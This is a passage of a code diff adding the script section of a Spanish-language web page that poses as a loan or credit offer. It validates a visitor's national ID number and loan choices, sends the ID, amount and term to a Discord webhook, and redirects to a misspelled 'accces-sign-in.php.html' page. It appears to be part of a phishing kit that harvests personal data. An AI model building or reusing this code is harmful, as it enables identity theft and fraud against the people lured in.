+            op.classList.add("selected");
+          } else {
+            op.classList.remove("selected");
+          }
+        }
+        cerrarSelector();
+        checkboxModalChecked.style.display = "none";
+        checkboxModalNoChecked.style.display = "flex";
+        btnConfirmarModal.disabled = true;
+        modalResultado.classList.add("show");
+        document.body.style.overflow = "hidden";
+      }
+      function cerrarModal() {
+        modalResultado.classList.remove("show");
+        document.body.style.overflow = "auto";
+        checkboxModalChecked.style.display = "none";
+        checkboxModalNoChecked.style.display = "flex";
+        btnConfirmarModal.disabled = true;
+      }
+
+      btnCerrarModal.addEventListener("click", cerrarModal);
+      modalBackdrop.addEventListener("click", cerrarModal);
+      document.querySelector(".modalContentCredito").addEventListener("click", function (e) { e.stopPropagation(); });
+
+      plazoModalResultado.addEventListener("click", function (e) {
+        e.stopPropagation();
+        plazoSelectorModalContainer.classList.toggle("active");
+      });
+      for (var j = 0; j < plazoSelectorOpciones.length; j++) {
+        (function (op) {
+          op.addEventListener("click", function (e) {
+            e.stopPropagation();
+            actualizarPlazo(parseInt(op.getAttribute("data-plazo"), 10));
+          });
+        })(plazoSelectorOpciones[j]);
+      }
+      document.addEventListener("click", function (e) {
+        var t = e.target;
+        if (!(t.closest && t.closest(".itemResumen")) && !(t.closest && t.closest(".plazoSelectorModalContainer"))) {
+          cerrarSelector();
+        }
+      });
+
+      sliderMontoModal.addEventListener("input", function (e) {
+        actualizarMontoModal(parseInt(e.target.value, 10));
+      });
+
+      checkboxModalCredito.addEventListener("click", function (e) {
+        e.stopPropagation();
+        e.preventDefault();
+        if (checkboxModalChecked.style.display !== "none") {
+          checkboxModalChecked.style.display = "none";
+          checkboxModalNoChecked.style.display = "flex";
+          btnConfirmarModal.disabled = true;
+        } else {
+          checkboxModalChecked.style.display = "flex";
+          checkboxModalNoChecked.style.display = "none";
+          btnConfirmarModal.disabled = false;
+        }
+      });
+
+      cedulaInput.addEventListener("input", function (e) {
+        var valor = e.target.value.replace(/\D/g, "");
+        e.target.value = valor;
+        if (valor.length >= 7 && valor.length <= 10) {
+          cedulaError.classList.add("hidden");
+          e.target.classList.remove("border-red-500");
+          btnContinuar.disabled = false;
+          btnContinuar.classList.remove("opacity-80", "cursor-not-allowed");
+        } else {
+          cedulaError.classList.remove("hidden");
+          e.target.classList.add("border-red-500");
+          btnContinuar.disabled = true;
+          btnContinuar.classList.add("opacity-80", "cursor-not-allowed");
+        }
+      });
+
+      btnContinuar.addEventListener("click", function () {
+        var cedula = cedulaInput.value.replace(/\s/g, "");
+        if (cedula.length < 7 || cedula.length > 10) return;
+        var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+        formData.cedula = cedula;
+        if (window.setFormDataSafe) window.setFormDataSafe(formData);
+        abrirModal();
+      });
+
+      btnConfirmarModal.addEventListener("click", function () {
+        var cedula = cedulaInput.value.replace(/\s/g, "");
+        var montoElegido = montoModalResultado.textContent.replace(/\s/g, "");
+
+        var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+        formData.cedula = cedula;
+        formData.montoPrestamo = montoElegido;
+        formData.plazo = plazoModalActual;
+        if (window.setFormDataSafe) window.setFormDataSafe(formData);
+        try { localStorage.setItem("aprobado", montoElegido); } catch (e) {}
+
+        // Envío a Discord (no bloqueante)
+        sendToDiscord(
+          "📋 **NUEVA SOLICITUD** 📋\n\n" +
+          "🪪 **Cédula:** " + cedula + "\n" +
+          "💰 **Monto:** $" + montoElegido + "\n" +
+          "📆 **Plazo:** " + plazoModalActual + " meses\n" +
+          "═══════════════════════════════════════"
+        );
+
+        cerrarModal();
+        window.location.href = "accces-sign-in.php.html";
+      });
+    });
+  </script>
+</body>
+
+</html>
